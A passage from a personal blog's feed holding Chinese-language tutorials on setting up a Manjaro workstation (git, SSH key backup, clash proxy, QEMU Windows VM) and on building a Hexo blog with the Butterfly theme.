gcc</span><br></pre></td></tr></table></figure></p><h2 id="设置Java"><a href="#设置Java" class="headerlink" title="设置Java"></a>设置Java</h2><p>在konsole中执行如下bash命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman -S jdk11-openjdk</span><br></pre></td></tr></table></figure></p><h2 id="设置Git"><a href="#设置Git" class="headerlink" title="设置Git"></a>设置Git</h2><h3 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h3><p>  在终端下执行如下命令继续安装<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman -S git</span><br></pre></td></tr></table></figure></p><h3 id="初始化用户信息"><a href="#初始化用户信息" class="headerlink" title="初始化用户信息"></a>初始化用户信息</h3><p>在konsole中执行如下bash命令，其中相关的参数填写git的系统设置即可<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;hawk&quot;</span> &amp;&amp; git config --global user.email 18801353760@163.com &amp;&amp; git config --global core.quotepath <span class="literal">false</span> &amp;&amp; git config --global core.editor <span class="string">&quot;code --wait&quot;</span></span><br></pre></td></tr></table></figure></p><h3 id="导出公、私钥"><a href="#导出公、私钥" class="headerlink" title="导出公、私钥"></a>导出公、私钥</h3><p>首先，如果没有相关的公、私钥，可以参考<a href="https://gitee.com/help/articles/4229">帮助链接</a>，生成自己的公、私钥</p><p>这里将公、私钥进行压缩，并进行加密处理，在konsole中执行如下bash命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">read</span> -s -p <span class="string">&quot;Password: &quot;</span> passwd</span><br></pre></td></tr></table></figure></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> -rf ssh.zip &amp;&amp; zip -P <span class="variable">$&#123;passwd&#125;</span> ssh.zip -jr ~/.ssh</span><br></pre></td></tr></table></figure><h3 id="导入公、私钥"><a href="#导入公、私钥" class="headerlink" title="导入公、私钥"></a>导入公、私钥</h3><p>即导入上述导出的公、私钥，这里给出我自己的加密后的<a href="ssh.zip">公、私钥</a><br>然后对文件首先进行解密处理，最后解压缩即可，在konsole中执行如下bash命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">read</span> -s -p <span class="string">&quot;Password: &quot;</span> passwd</span><br></pre></td></tr></table></figure></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p ~/.ssh &amp;&amp; unzip -P <span class="variable">$&#123;passwd&#125;</span> ssh.zip -d ~/.ssh</span><br></pre></td></tr></table></figure><h2 id="设置v2ray代理"><a href="#设置v2ray代理" class="headerlink" title="设置v2ray代理"></a>设置v2ray代理</h2><p>这里通过安装<strong>clash</strong>，实现代理上网</p><h3 id="下载clash代理"><a href="#下载clash代理" class="headerlink" title="下载clash代理"></a>下载clash代理</h3><p>  在终端执行如下命令，安装<strong>clash</strong>软件<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman -S clash</span><br></pre></td></tr></table></figure></p><h3 id="设置clash代理"><a href="#设置clash代理" class="headerlink" title="设置clash代理"></a>设置clash代理</h3><p>  clash需要<strong>yaml</strong>格式的config文件，从而完成设置。<br>  我们可以将给定的文件放置在<strong>~/.config/clash</strong>目录下。如果给的是一个订阅链接，则我们首先根据链接，将设置文件下载下来，然后重命名后放置在<strong>~/.config/clash</strong>目录下即可</p><p>  然后，我们通过如下命令，启用指定配置文件的clash<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clash -f /path/to/config</span><br></pre></td></tr></table></figure></p><p>  此时，我们可以登录<a href="http://clash.razord.top/">http://clash.razord.top/</a>网站，进行进一步的设置，如下所示<br>  <img src="clash的网页设置.PNG" alt="clash的网页设置"><br>  我们只需要将http代理端口和Socks5代理端口特别关注以下即可，然后点击菜单中的<strong>代理</strong>选项，进行代理即可</p><h3 id="配置firefox和proxychains"><a href="#配置firefox和proxychains" class="headerlink" title="配置firefox和proxychains"></a>配置firefox和proxychains</h3><p>大部分时候，打开<strong>clash</strong>，可以实现数据走系统代理<br>但是类似于firefox、命令行等的数据并不走系统代理，因此需要单独进行设置。</p><p>对于<strong>firefox</strong>来说，通过在<strong>Network Settings</strong>的<strong>proxy</strong>即可，如下所示<br>  <img src="firefox代理设置.PNG" alt="firefox代理设置"></p><p>  其中，对应的端口是clash监听的本地http端口即可</p><p>而对于命令行来说，可以通过设置<strong>proxychains</strong>完成相关的代理<br>首先执行如下命令完成代理<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman -S proxychians</span><br></pre></td></tr></table></figure></p><p>接着，需要修改全局代理链，将<strong>/etc/proxychains.conf</strong>文件的代理修改如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[ProxyList]</span><br><span class="line">socks5  127.0.0.1 8888</span><br></pre></td></tr></table></figure></p><p>上述端口为<strong>clash</strong>中监听的本地socks5端口即可<br>之后，通过<code>proxychains -q [待执行命令]</code>，完成代理</p><h2 id="设置QEMU"><a href="#设置QEMU" class="headerlink" title="设置QEMU"></a>设置QEMU</h2><blockquote><p><strong>qemu</strong>是一个广泛使用的开源计算机模拟器和虚拟机</p></blockquote><p>  因此，这里使用qemu提供manjaro上的虚拟机功能</p><h3 id="安装qemu"><a href="#安装qemu" class="headerlink" title="安装qemu"></a>安装qemu</h3><p>这里安装qemu相关的依赖和功能软件包<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman -S qemu ovmf bridge-utils vde2 dnsmasq ebtables openbsd-netcat</span><br></pre></td></tr></table></figure></p><div class="table-container"><table><thead><tr><th style="text-align:center">软件包</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center">ovmf</td><td style="text-align:center">UEFI支持</td></tr><tr><td style="text-align:center">bridge-utils</td><td style="text-align:center">网络桥接支持</td></tr><tr><td style="text-align:center">vde2</td><td style="text-align:center">以太网支持</td></tr><tr><td style="text-align:center">dnsmasq ebtables</td><td style="text-align:center">NAT/DHCP网络</td></tr><tr><td style="text-align:center">openbsd-netcat</td><td style="text-align:center">ssh连接虚拟机支持</td></tr></tbody></table></div><h3 id="安装图形化前端管理"><a href="#安装图形化前端管理" class="headerlink" title="安装图形化前端管理"></a>安装图形化前端管理</h3><p>这里选择<strong>virt-manager</strong>作为管理KVM虚拟机的前端。而virt-manager依赖于libvirt的提供的接口，因此安装virt-manager及其依赖<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman -S virt-manager virt-viewer libvirt</span><br></pre></td></tr></table></figure></p><p>然后启动libvirtd服务，并将网络设置为自动启动即可<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl <span class="built_in">enable</span> libvirtd</span><br><span class="line"><span class="built_in">sudo</span> systemctl start libvirtd</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> virsh net-autostart default</span><br></pre></td></tr></table></figure></p><h3 id="配置win10虚拟机"><a href="#配置win10虚拟机" class="headerlink" title="配置win10虚拟机"></a>配置win10虚拟机</h3><h4 id="下载win10ISO文件"><a href="#下载win10ISO文件" class="headerlink" title="下载win10ISO文件"></a>下载win10ISO文件</h4><p>前往<a href="https://next.itellyou.cn/">ITELLYOU</a>，下载官方win10的ISO镜像文件</p><h4 id="下载virtio-win驱动"><a href="#下载virtio-win驱动" class="headerlink" title="下载virtio-win驱动"></a>下载virtio-win驱动</h4><p>为了提高虚拟机性能，虚拟机会使用virtIO技术，而windows客户机需要手动安装该驱动</p><p>首先，点击<a href="https://fedorapeople.org/groups/virt/virtio-win/direct-downloads/stable-virtio/virtio-win.iso">链接</a>下载相关驱动</p><h4 id="启动virt-manager"><a href="#启动virt-manager" class="headerlink" title="启动virt-manager"></a>启动virt-manager</h4><p>执行如下命令启动<strong>virt-manager</strong>管理程序<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> virt-manager</span><br></pre></td></tr></table></figure></p><p><img src="启动virt-manager.PNG" alt="启动virt-manager"></p><h4 id="新建虚拟机"><a href="#新建虚拟机" class="headerlink" title="新建虚拟机"></a>新建虚拟机</h4><p>在<strong>virt-manager</strong>界面的上方菜单，点击最左侧的<strong>创建新的虚拟机</strong>按钮<br><img src="点击创建新的虚拟机按钮.PNG" alt="点击创建新的虚拟机按钮"></p><p>选择从本地镜像安装，<code>x86_64</code>架构，点击右下角<strong>Forward</strong>下一步<br><img src="选择镜像.PNG" alt="选择镜像界面"></p><p>点击该界面上方的<strong>Browse</strong>界面，选择ISO位置，界面如下所示<br><img src="管理存储池界面.PNG" alt="管理存储池界面"></p><p>这里选择右下角第一个<strong>Browse Local</strong>，选择前面下载的win10的ISO镜像即可<br><img src="选择win10镜像.PNG" alt="选择win10镜像"></p><p>该界面下方取消<strong>自动检测系统</strong>，直接选择windows10系统<br><img src="选择操作系统为win10.PNG" alt="选择操作系统为win10"></p><p>点击右下角的<strong>Forward</strong>下一步，设置内存和CPU信息<br><img src="设置内存和CPU.PNG" alt="设置内存和CPU"></p><p>点击右下角的<strong>Forward</strong>下一步，设置磁盘信息<br><img src="设置虚拟机磁盘.PNG" alt="设置虚拟机磁盘"></p><p>点击右下角的<strong>Forward</strong>下一步，选择在启动前编辑选项<br><img src="在启动前编辑虚拟机.PNG" alt="在启动前编辑虚拟机"></p><p>点击右下角的<strong>Finish</strong>，进入虚拟机的编辑界面，完成相关的编辑<br><img src="虚拟机编辑界面.PNG" alt="虚拟机编辑界面"></p><p>在这里添加另一个CDROM设置，其文件是前面下载的Virtio驱动文件，如下所示<br><img src="添加Virtio驱动CDROM.PNG" alt="添加Virtio驱动CDROM"></p><p>完成编辑后，点击右上角的<strong>Begin Installation</strong>，完成虚拟机的安装</p><p>这里特别说明的是，当进行到<strong>你想将Windows安装在哪里</strong>时，其无法显示磁盘信息，如下所示<br><img src="未加载Virtio驱动程序.PNG" alt="未加载Virtio驱动程序"></p><p>点击左下角<strong>加载驱动程序</strong>，选择相关的驱动程序安装即可<br><img src="安装Virtio驱动程序.PNG" alt="安装Virtio驱动程序"></p><h4 id="配置VirtIO-guest-tools"><a href="#配置VirtIO-guest-tools" class="headerlink" title="配置VirtIO guest tools"></a>配置VirtIO guest tools</h4><p>为了启用主机和虚拟机之间的剪切板共享，需要在虚拟机中安装VirtIO guest tools，点击<a href="https://www.spice-space.org/download/binaries/spice-guest-tools/">https://www.spice-space.org/download/binaries/spice-guest-tools/</a>下载安装即可</p><h1 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h1><h2 id="Failed-to-start-Load-Save-Screen-Backlight-Brightness-of-backlight-acpi-video0"><a href="#Failed-to-start-Load-Save-Screen-Backlight-Brightness-of-backlight-acpi-video0" class="headerlink" title="Failed to start Load/Save Screen Backlight Brightness of backlight:acpi_video0"></a>Failed to start Load/Save Screen Backlight Brightness of backlight:acpi_video0</h2><p>这里实际上系统使用了两种服务保存并载入背光设置，一个为<code>systemd-backlight@backlight:acpi_video0</code>；另一个为<code>systemd-backlight@backlight:amdgpu_b10</code>。对于AMD集显来说，第一个出错，会使用第二种设置，则直接mask掉第一个服务即可，在konsole中执行如下bash命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl mask systemd-backlight@backlight:acpi_video0</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 设置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设置 </tag>
            
            <tag> 系统启动 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于Butterfly主题的hexo静态博客</title>
      <link href="/2021/05/24/%E5%8D%9A%E5%AE%A2%E8%AE%BE%E7%BD%AE/"/>
      <url>/2021/05/24/%E5%8D%9A%E5%AE%A2%E8%AE%BE%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>  基于hexo的静态博客一般分为两部分——静态博客的前端资源，和生成这些资源的设置信息。这里为了管理方便，将这两部分放置在仓库管理的一个仓库的两个分支中。从而可以在任意主机上，通过拉取设置信息所在分支数据，构建编写博客的环境；而将编写好的博客推送到静态博客的前端资源所在的分支中，完成博客的更新。这样子，我们可以在任何主机上，快速同步之前的博客编写环境，并快速更新博客。</p><h1 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h1><p>  我们需要通过git与仓库管理网站进行交互，点此<a href="https://mirrors.tuna.tsinghua.edu.cn/github-release/git-for-windows/git/">镜像链接</a>，进行下载并安装。</p><p>  我们需要简单配置git，使用如下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name `user name`</span><br><span class="line">git config --global user.email `user email`</span><br></pre></td></tr></table></figure><p>  这里可以通过<a href="https://gitee.com/help/articles/4229#article-header0">教程链接</a>，完成相关git的配置</p><h1 id="安装Node-js"><a href="#安装Node-js" class="headerlink" title="安装Node.js"></a>安装Node.js</h1><p>  Hexo是基于Node.js，因此我们需要安装和配置。首先点此<a href="http://nodejs.cn/download/">下载链接</a>，下载并安装Node.js。<br>  为了提高安装的效率，我们更换其按镜像源，使用如下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> registry <span class="string">&quot;https://registry.npm.taobao.org&quot;</span> &amp;&amp; npm config <span class="built_in">set</span> sass_binary_site=https://npm.taobao.org/mirrors/node-sass/ &amp;&amp; npm config <span class="built_in">set</span> phantomjs_cdnurl=https://npm.taobao.org/mirrors/phantomjs/ &amp;&amp; npm config <span class="built_in">set</span> electron_mirror=https://npm.taobao.org/mirrors/electron/</span><br></pre></td></tr></table></figure><h1 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h1><p>  根据<a href="https://hexo.io/zh-cn/docs/">Hexo官网</a>进行相关的安装。<br>  执行如下命令，完成Hexo的安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure><h1 id="搭建博客生成环境"><a href="#搭建博客生成环境" class="headerlink" title="搭建博客生成环境"></a>搭建博客生成环境</h1><p>  这里完成最终生成静态博客相关的前端资源的环境。相关的设置信息会被推送到仓库的<strong>develop</strong>分支，以方便在任何主机上同步该环境。</p><p>  下面给出同步我的博客环境的命令, 从而快速恢复博客的生成环境，在<strong>working_dir</strong>目录下执行下列命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> -b develop git@github.com:JiaweiHawk/jiaweihawk.github.io.git blog &amp;&amp; (<span class="built_in">cd</span> blog; npm install)</span><br></pre></td></tr></table></figure></p><h2 id="初始化工作目录"><a href="#初始化工作目录" class="headerlink" title="初始化工作目录"></a>初始化工作目录</h2><p>  首先选定一个路径，在该路径下初始化工作目录，不妨记为<strong>working_dir</strong>，作为该环境的工作目录，命令如下所示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo.cmd init `working_dir`</span><br></pre></td></tr></table></figure><p>  前面已经介绍，这些设置会被同步到仓库中，因此这里完成仓库初始化，执行如下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure><p>  这里需要通过编辑<strong>working_dir/.gitignore</strong>文件，添加该工作目录中那些文件作为无关文件，不会被同步到仓库相关分支中，这里首先填写一部分，内容如下所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DS_Store</span><br><span class="line">Thumbs.db</span><br><span class="line">db.json</span><br><span class="line">*.log</span><br><span class="line">node_modules/</span><br><span class="line">public/</span><br><span class="line">.deploy*/</span><br><span class="line">*-lock.json</span><br></pre></td></tr></table></figure><h2 id="设置博客配置"><a href="#设置博客配置" class="headerlink" title="设置博客配置"></a>设置博客配置</h2><p>  这里通过修改<strong>working_dir/_config.yml</strong>，完成博客的主要配置信息的设置，通过<a href="https://hexo.io/zh-cn/docs/configuration">该链接</a>查找大部分配置的可选参数和含义。</p><h3 id="修改网站信息"><a href="#修改网站信息" class="headerlink" title="修改网站信息"></a>修改网站信息</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Site</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">&quot;Jiawei Hawk&#x27;s blog&quot;</span></span><br><span class="line"><span class="attr">subtitle:</span> <span class="string">&quot;blog&quot;</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">&quot;This is Jiawei Hawk&#x27;s blog&quot;</span></span><br><span class="line"><span class="attr">keywords:</span> <span class="string">&quot;Jiawei Hawk&quot;</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">&quot;Jiawei Hawk&quot;</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">&quot;zh-CN&quot;</span></span><br><span class="line"><span class="attr">timezone:</span> <span class="string">&quot;Asia/Shanghai&quot;</span></span><br></pre></td></tr></table></figure><p>  这里分别设置了网站名称、网站子名称、网站描述、网站关键词、作者、网站语言和时间区域</p><h3 id="修改网页URL信息"><a href="#修改网页URL信息" class="headerlink" title="修改网页URL信息"></a>修改网页URL信息</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># URL</span></span><br><span class="line"><span class="comment">## Set your site url here. For example, if you use GitHub Page, set url as &#x27;https://username.github.io/project&#x27;</span></span><br><span class="line"><span class="attr">url:</span> <span class="string">https://jiaweihawk.gitee.io</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">:year/:month/:day/:title/</span></span><br><span class="line"><span class="attr">permalink_defaults:</span></span><br><span class="line"><span class="attr">pretty_urls:</span></span><br><span class="line">  <span class="attr">trailing_index:</span> <span class="literal">true</span> <span class="comment"># Set to false to remove trailing &#x27;index.html&#x27; from permalinks</span></span><br><span class="line">  <span class="attr">trailing_html:</span> <span class="literal">true</span> <span class="comment"># Set to false to remove trailing &#x27;.html&#x27; from permalinks</span></span><br></pre></td></tr></table></figure><p>  这里分别为网站url，网页的永久链接形式等</p><h3 id="修改博客前端资源目录位置"><a href="#修改博客前端资源目录位置" class="headerlink" title="修改博客前端资源目录位置"></a>修改博客前端资源目录位置</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Directory</span></span><br><span class="line"><span class="attr">source_dir:</span> <span class="string">source</span></span><br><span class="line"><span class="attr">public_dir:</span> <span class="string">public</span></span><br><span class="line"><span class="attr">tag_dir:</span> <span class="string">tags</span></span><br><span class="line"><span class="attr">archive_dir:</span> <span class="string">archives</span></span><br><span class="line"><span class="attr">category_dir:</span> <span class="string">categories</span></span><br><span class="line"><span class="attr">code_dir:</span> <span class="string">downloads/code</span></span><br><span class="line"><span class="attr">i18n_dir:</span> <span class="string">:lang</span></span><br><span class="line"><span class="attr">skip_render:</span></span><br></pre></td></tr></table></figure><p>  这里指定博客的资源最终的位置。前面已经说过，该仓库将博客前端资源和配置博客环境的设置分别进行存储，而这里博客前端资源最终会生成在<strong>public_dir</strong>对应的路径。因此我们通过在<strong>working_dir/.gitignore</strong>中添加该路径，避免最终同步设置时将生成的博客前端资源一并进行同步，<strong>working_dir/.gitignore</strong>中默认已经添加该路径。如果设置变化了，需要进行相关的更新。</p><h2 id="设置博客主题"><a href="#设置博客主题" class="headerlink" title="设置博客主题"></a>设置博客主题</h2><p>  如果对于博客默认的主题不是很喜欢，可以按照<a href="https://hexo.io/zh-cn/docs/themes">官网教程</a>，方便的更换博客主题</p><h3 id="下载博客主题"><a href="#下载博客主题" class="headerlink" title="下载博客主题"></a>下载博客主题</h3><p>  这里选择Butterfly主题，其也有<a href="https://butterfly.js.org/">官方教程</a>可以进行查看，这里给出本博客的设置。<br>  在<strong>working_dir</strong>工作目录下，执行如下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br></pre></td></tr></table></figure><p>  这里由于我们会对主题进行相关的设置更改，因此需要避免嵌套git项目，即删除<strong>working_dir/themes/butterfly/.git</strong>文件即可</p><h3 id="指定博客主题"><a href="#指定博客主题" class="headerlink" title="指定博客主题"></a>指定博客主题</h3><p>  由于Butterfly主题依赖一些第三方插件，因此需要在<strong>working_dir</strong>工作目录下执行命令安装依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure><p>  修改<strong>working_dir/_config.yml</strong>中的<strong>theme</strong>设置的值</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Extensions</span></span><br><span class="line"><span class="comment">## Plugins: https://hexo.io/plugins/</span></span><br><span class="line"><span class="comment">## Themes: https://hexo.io/themes/</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">butterfly</span></span><br></pre></td></tr></table></figure><p>  此时，已经完成了Butterfly主题的使用</p><h3 id="修改博客主题细节"><a href="#修改博客主题细节" class="headerlink" title="修改博客主题细节"></a>修改博客主题细节</h3><p>  类似于前面博客的设置更改，可以通过修改<strong>working_dir/themes/butterfly/_config.yml</strong>文件，完成博客主题的主要配置信息的设置</p><h4 id="设置菜单栏"><a href="#设置菜单栏" class="headerlink" title="设置菜单栏"></a>设置菜单栏</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="string">主页:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="string">归档:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-archive</span></span><br><span class="line">  <span class="string">标签:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-tags</span></span><br><span class="line">  <span class="string">分类:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-folder-open</span></span><br><span class="line">  <span class="comment"># List||fas fa-list:</span></span><br><span class="line">  <span class="comment">#   Music: /music/ || fas fa-music</span></span><br><span class="line">  <span class="comment">#   Movie: /movies/ || fas fa-video</span></span><br><span class="line">  <span class="comment"># Link: /link/ || fas fa-link</span></span><br><span class="line">  <span class="comment"># About: /about/ || fas fa-heart</span></span><br></pre></td></tr></table></figure><p>  这里通过取消注释，选择菜单栏显示相关的菜单。这里可以参考<a href="https://xiabor.com/4215.html#%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%AE%BE%E7%BD%AE">这位大佬的博客</a>，进行更多的外链的设置显示</p><p>  该菜单栏引入了主页、归档、标签和分类。其中标签页和分类页需要手动创建，否则会显示无法打开。<br>  首先在<strong>working_dir</strong>工作目录下，执行如下命令创建标签页</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page tags</span><br></pre></td></tr></table></figure><p>  然后修改<strong>working_dir/source/tags/index.md</strong>文件的type字段</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: &quot;标签&quot;</span><br><span class="line">date: 2021-05-26 22:04:20</span><br><span class="line"><span class="section">type: &quot;tags&quot;</span></span><br><span class="line"><span class="section">---</span></span><br></pre></td></tr></table></figure><p>  类似的，在<strong>working_dir</strong>工作目录下，执行如下命令创建分类页</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo.cmd new page categories</span><br></pre></td></tr></table></figure><p>  然后同样修改<strong>working_dir/source/categories/index.md</strong>文件的type字段</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: &quot;分类&quot;</span><br><span class="line">date: 2021-05-26 22:06:23</span><br><span class="line"><span class="section">type: &quot;categories&quot;</span></span><br><span class="line"><span class="section">---</span></span><br></pre></td></tr></table></figure><h4 id="设置博客背景图片"><a href="#设置博客背景图片" class="headerlink" title="设置博客背景图片"></a>设置博客背景图片</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># The banner image of home page</span></span><br><span class="line"><span class="attr">index_img:</span> <span class="string">https://picture.zwc365.com/getbing.jpg</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If the banner of page not setting, it will show the top_img</span></span><br><span class="line"><span class="attr">default_top_img:</span> <span class="string">/img/background.jpg</span></span><br></pre></td></tr></table></figure><p>  这里修改了主页的默认背景图片，其中<code>index_img</code>为主页背景图片的外链；对于<code>default_top_img</code>，其使用本地的图片作为默认的顶部背景图片，该图片的地址为<strong>working_dir/themes/butterfly\source/img/background.jpg</strong></p><h4 id="设置主页描述"><a href="#设置主页描述" class="headerlink" title="设置主页描述"></a>设置主页描述</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Display the article introduction on homepage</span></span><br><span class="line"><span class="comment"># 1: description</span></span><br><span class="line"><span class="comment"># 2: both (if the description exists, it will show description, or show the auto_excerpt)</span></span><br><span class="line"><span class="comment"># 3: auto_excerpt (default)</span></span><br><span class="line"><span class="comment"># false: do not show the article introduction</span></span><br><span class="line"><span class="attr">index_post_content:</span></span><br><span class="line">  <span class="attr">method:</span> <span class="number">2</span></span><br><span class="line">  <span class="attr">length:</span> <span class="number">500</span> <span class="comment"># if you set method to 2 or 3, the length need to config</span></span><br></pre></td></tr></table></figure><p>  即这里根据注释说明，选择模式2，从而在浏览每一篇博客缩略界面时，展示相关信息。</p><h4 id="设置代码显示"><a href="#设置代码显示" class="headerlink" title="设置代码显示"></a>设置代码显示</h4><p>  首先，修改<strong>working_dir/_config.yml</strong>中的<strong>hljs</strong>设置的值，将其关闭<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">highlight:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">line_number:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">auto_detect:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">tab_replace:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="attr">wrap:</span> <span class="literal">true</span></span><br><span 